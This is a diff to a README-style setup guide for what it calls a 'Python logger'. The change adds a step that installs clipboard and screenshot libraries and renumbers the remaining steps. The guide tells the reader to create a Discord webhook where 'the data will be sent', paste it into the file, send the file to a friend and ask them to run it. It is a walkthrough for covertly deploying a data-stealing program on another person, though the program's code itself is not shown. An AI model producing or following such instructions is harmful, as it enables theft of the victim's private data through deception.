@@ -4,9 +4,16 @@ This guide explains how to set up the Python logger quickly and correctly
 
 Follow each step carefully - it takes less than 2 minutes
 
+## 📦 Step 1 -- Download All Requirements
+
+1. Press: `🪟 + R`
+2. Type: `CMD`
+3. Run this command to download requirements: `pip install requests psutil pyperclip pillow`
+4. Wait until all requirements are successfully downloaded
+
 ---
 
-## 📥 Step 1 -- Download the File
+## 📥 Step 2 -- Download the File
 
 1. Open this repository
 2. Click the file you want to use
@@ -19,7 +26,7 @@ Follow each step carefully - it takes less than 2 minutes
 
 ---
 
-## 🔗 Step 2 -- Create a Discord Webhook
+## 🔗 Step 3 -- Create a Discord Webhook
 
 This webhook is where the data will be sent
 
@@ -55,7 +62,7 @@ https://discord.com/api/webhooks/123456789012345678/ABCDEF...
 
 ---
 
-## 🧩 Step 3 -- Insert the Webhook Into the File
+## 🧩 Step 4 -- Insert the Webhook Into the File
 
 1. Open the downloaded file in:
 
@@ -85,7 +92,7 @@ Press Save.
 
 ---
 
-## 🚀 Step 4 -- Send It to a Friend
+## 🚀 Step 5 -- Send It to a Friend
 Send the edited file to your friend
 
 Ask them to run it normally
